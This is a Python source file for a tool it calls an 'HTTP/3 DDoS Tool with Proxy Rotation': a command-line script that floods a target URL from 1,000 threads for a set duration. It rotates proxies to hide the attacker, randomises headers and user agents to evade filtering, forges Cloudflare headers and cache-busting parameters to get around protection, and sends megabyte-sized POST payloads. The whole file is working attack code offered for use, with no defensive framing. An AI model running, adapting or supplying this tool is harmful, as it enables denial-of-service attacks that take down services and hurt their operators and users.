import requests
import random
import threading
import time
import socket
import ssl
import urllib3
from multiprocessing import Pool, cpu_count
from concurrent.futures import ThreadPoolExecutor
import argparse
import sys
import os
import json

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class HTTP3DDoS:
    def __init__(self):
        self.target_url = ""
        self.proxy_list = []
        self.threads = 1000
        self.duration = 300
        self.timeout = 5
        self.randomize_headers = True
        self.randomize_user_agents = True
        self.randomize_payload = True
        self.use_http3 = True
        self.verify_ssl = False
        self.follow_redirects = False
        self.cloudflare_bypass = True
        self.cache_bypass = True
        self.request_method = "GET"
        self.payload_size = 1024
        self.stats = {
            "requests_sent": 0,
            "successful_requests": 0,
            "failed_requests": 0,
            "bytes_sent": 0,
            "start_time": 0,
            "elapsed_time": 0
        }
        
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
        ]
        
        self.referers = [
            "https://www.google.com/",
            "https://www.facebook.com/",
            "https://www.twitter.com/",
            "https://www.instagram.com/",
            "https://www.linkedin.com/",
            "https://www.youtube.com/",
            "https://www.reddit.com/",
            "https://www.bing.com/",
            "https://www.yahoo.com/",
            "https://www.amazon.com/"
        ]
        
        self.payloads = [
            "a" * 1024,
            "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 1000000\r\n\r\n" + "a" * 1000000,
            "GET / HTTP/1.1\r\nHost: target.com\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n",
            "GET /?q=" + "a" * 5000 + " HTTP/1.1\r\nHost: target.com\r\n\r\n",
            "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 1000000\r\n\r\n" + "a" * 1000000,
            "GET / HTTP/1.1\r\nHost: target.com\r\nConnection: keep-alive\r\n\r\n",
            "GET / HTTP/1.1\r\nHost: target.com\r\nAccept-Encoding: gzip, deflate\r\n\r\n",
            "GET / HTTP/1.1\r\nHost: target.com\r\nCookie: session_id=" + "a" * 1000 + "\r\n\r\n"
        ]
        
        self.cloudflare_ips = [
            "173.245.48.0/20",
            "103.21.244.0/22",
            "103.22.200.0/22",
            "103.31.4.0/22",
            "141.101.64.0/18",
            "108.162.192.0/18",
            "190.93.240.0/20",
            "188.114.96.0/20",
            "197.234.240.0/22",
            "198.41.128.0/17",
            "162.158.0.0/15",
            "104.16.0.0/13",
            "104.24.0.0/14",
            "172.64.0.0/13",
            "131.0.72.0/22"
        ]
    
    def load_proxies(self, proxy_file):
        try:
            with open(proxy_file, 'r') as f:
                proxies = f.read().splitlines()
                self.proxy_list = [proxy.strip() for proxy in proxies if proxy.strip()]
                print(f"Loaded {len(self.proxy_list)} proxies")
                return True
        except Exception as e:
            print(f"Error loading proxies: {e}")
            return False
    
    def generate_random_headers(self):
        headers = {
            "User-Agent": random.choice(self.user_agents) if self.randomize_user_agents else "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }
        
        if self.randomize_headers:
            if random.random() > 0.5:
                headers["Referer"] = random.choice(self.referers)
            
            if random.random() > 0.7:
                headers["DNT"] = "1"
            
            if random.random() > 0.8:
                headers["Sec-Fetch-Dest"] = random.choice(["document", "empty", "script", "style"])
                headers["Sec-Fetch-Mode"] = random.choice(["navigate", "cors", "no-cors"])
                headers["Sec-Fetch-Site"] = random.choice(["none", "same-origin", "cross-site"])
            
            if random.random() > 0.9:
                headers["Cache-Control"] = random.choice(["no-cache", "max-age=0", "no-store"])
                headers["Pragma"] = "no-cache"
        
        return headers
    
    def generate_random_payload(self):
        if not self.randomize_payload:
            return self.payloads[0]
        
        payload_type = random.randint(0, len(self.payloads) - 1)
        return self.payloads[payload_type]
    
    def get_random_proxy(self):
        if not self.proxy_list:
            return None
        
        proxy = random.choice(self.proxy_list)
        proxy_parts = proxy.split(":")
        
        if len(proxy_parts) == 4:
            proxy_url = f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
        else:
            proxy_url = f"http://{proxy_parts[0]}:{proxy_parts[1]}"
        
        return {"http": proxy_url, "https": proxy_url}
    
    def make_request(self):
        proxy = self.get_random_proxy()
        headers = self.generate_random_headers()
        
        if self.cloudflare_bypass:
            headers["CF-IPCountry"] = random.choice(["US", "CA", "GB", "DE", "FR", "AU", "JP"])
            headers["CF-Ray"] = f"{random.randint(1000000000000, 9999999999999)}"
            headers["CF-Visitor"] = '{"scheme":"https"}'
        
        if self.cache_bypass:
            cache_buster = f"?_={int(time.time() * 1000)}"
            url = self.target_url + cache_buster if "?" not in self.target_url else self.target_url + "&_=" + str(int(time.time() * 1000))
        else:
            url = self.target_url
        
        payload = self.generate_random_payload()
        
        try:
            if self.use_http3:
                session = requests.Session()
                session.headers.update(headers)
                
                if proxy:
                    session.proxies.update(proxy)
                
                if self.request_method == "GET":
                    response = session.get(
                        url,
                        timeout=self.timeout,
                        verify=self.verify_ssl,
                        allow_redirects=self.follow_redirects
                    )
                elif self.request_method == "POST":
                    response = session.post(
                        url,
                        data=payload,
                        timeout=self.timeout,
                        verify=self.verify_ssl,
                        allow_redirects=self.follow_redirects
                    )
                elif self.request_method == "HEAD":
                    response = session.head(
                        url,
                        timeout=self.timeout,
                        verify=self.verify_ssl,
                        allow_redirects=self.follow_redirects
                    )
                else:
                    response = session.get(
                        url,
                        timeout=self.timeout,
                        verify=self.verify_ssl,
                        allow_redirects=self.follow_redirects
                    )
                
                self.stats["successful_requests"] += 1
                self.stats["bytes_sent"] += len(payload)
                
                return True
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                
                if proxy:
                    proxy_parts = proxy["http"].replace("http://", "").split("@")
                    if len(proxy_parts) == 2:
                        auth, host_port = proxy_parts
                        username, password = auth.split(":")
                        host, port = host_port.split(":")
                        
                        sock.connect((host, int(port)))
                        sock.send(f"CONNECT {self.target_url.split('/')[2]}:443 HTTP/1.1\r\nHost: {self.target_url.split('/')[2]}\r\nProxy-Authorization: Basic {username}:{password}\r\n\r\n".encode())
                    else:
                        host, port = proxy_parts[0].split(":")
                        sock.connect((host, int(port)))
                        sock.send(f"CONNECT {self.target_url.split('/')[2]}:443 HTTP/1.1\r\nHost: {self.target_url.split('/')[2]}\r\n\r\n".encode())
                    
                    response = sock.recv(4096)
                    if b"200" not in response:
                        sock.close()
                        self.stats["failed_requests"] += 1
                        return False
                    
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    
                    sock = context.wrap_socket(sock, server_hostname=self.target_url.split('/')[2])
                else:
                    if url.startswith("https://"):
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        
                        sock = context.wrap_socket(sock, server_hostname=self.target_url.split('/')[2])
                        sock.connect((self.target_url.split('/')[2], 443))
                    else:
                        sock.connect((self.target_url.split('/')[2], 80))
                
                request = f"{self.request_method} {url.split('/', 3)[3] if len(url.split('/', 3)) > 3 else '/'} HTTP/1.1\r\n"
                
                for header, value in headers.items():
                    request += f"{header}: {value}\r\n"
                
                if self.request_method == "POST":
                    request += f"Content-Length: {len(payload)}\r\n"
                
                request += "\r\n"
                
                if self.request_method == "POST":
                    request += payload
                
                sock.send(request.encode())
                
                response = sock.recv(4096)
                sock.close()
                
                self.stats["successful_requests"] += 1
                self.stats["bytes_sent"] += len(request)
                
                return True
        except Exception as e:
            self.stats["failed_requests"] += 1
            return False
    
    def worker(self):
        while time.time() - self.stats["start_time"] < self.duration:
            self.make_request()
            self.stats["requests_sent"] += 1
    
    def print_stats(self):
        while time.time() - self.stats["start_time"] < self.duration:
            elapsed = time.time() - self.stats["start_time"]
            rps = self.stats["requests_sent"] / elapsed if elapsed > 0 else 0
            
            print(f"\rRequests: {self.stats['requests_sent']} | Success: {self.stats['successful_requests']} | Failed: {self.stats['failed_requests']} | RPS: {rps:.2f} | Bytes: {self.stats['bytes_sent']}", end="")
            
            time.sleep(1)
    
    def start_attack(self):
        self.stats["start_time"] = time.time()
        
        print(f"Starting attack on {self.target_url}")
        print(f"Using {len(self.proxy_list)} proxies")
        print(f"Running for {self.duration} seconds with {self.threads} threads")
        
        stats_thread = threading.Thread(target=self.print_stats)
        stats_thread.daemon = True
        stats_thread.start()
        
        threads = []
        
        for _ in range(self.threads):
            thread = threading.Thread(target=self.worker)
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        time.sleep(self.duration)
        
        for thread in threads:
            thread.join(timeout=0.1)
        
        self.stats["elapsed_time"] = time.time() - self.stats["start_time"]
        
        print("\nAttack completed")
        print(f"Total requests: {self.stats['requests_sent']}")
        print(f"Successful requests: {self.stats['successful_requests']}")
        print(f"Failed requests: {self.stats['failed_requests']}")
        print(f"Average RPS: {self.stats['requests_sent'] / self.stats['elapsed_time']:.2f}")
        print(f"Total bytes sent: {self.stats['bytes_sent']}")

def main():
    parser = argparse.ArgumentParser(description="HTTP/3 DDoS Tool with Proxy Rotation")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--proxies", required=True, help="Proxy file path")
    parser.add_argument("-t", "--threads", type=int, default=1000, help="Number of threads (default: 1000)")
    parser.add_argument("-d", "--duration", type=int, default=300, help="Attack duration in seconds (default: 300)")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST", "HEAD"], help="HTTP method (default: GET)")
    parser.add_argument("--timeout", type=int, default=5, help="Request timeout in seconds (default: 5)")
    parser.add_argument("--no-cloudflare", action="store_false", dest="cloudflare", help="Disable Cloudflare bypass")
    parser.add_argument("--no-cache", action="store_false", dest="cache", help="Disable cache bypass")
    parser.add_argument("--no-random-headers", action="store_false", dest="headers", help="Disable random headers")
    parser.add_argument("--no-random-ua", action="store_false", dest="ua", help="Disable random user agents")
    parser.add_argument("--no-random-payload", action="store_false", dest="payload", help="Disable random payloads")
    parser.add_argument("--no-http3", action="store_false", dest="http3", help="Disable HTTP/3")
    parser.add_argument("--verify-ssl", action="store_true", help="Verify SSL certificates")
    parser.add_argument("--follow-redirects", action="store_true", help="Follow redirects")
    
    args = parser.parse_args()
    
    ddos = HTTP3DDoS()
    ddos.target_url = args.url
    ddos.threads = args.threads
    ddos.duration = args.duration
    ddos.request_method = args.method
    ddos.timeout = args.timeout
    ddos.cloudflare_bypass = args.cloudflare
    ddos.cache_bypass = args.cache
    ddos.randomize_headers = args.headers
    ddos.randomize_user_agents = args.ua
    ddos.randomize_payload = args.payload
    ddos.use_http3 = args.http3
    ddos.verify_ssl = args.verify_ssl
    ddos.follow_redirects = args.follow_redirects
    
    if not ddos.load_proxies(args.proxies):
        sys.exit(1)
    
    try:
        ddos.start_attack()
    except KeyboardInterrupt:
        print("\nAttack stopped by user")
        sys.exit(0)

if __name__ == "__main__":
    main()
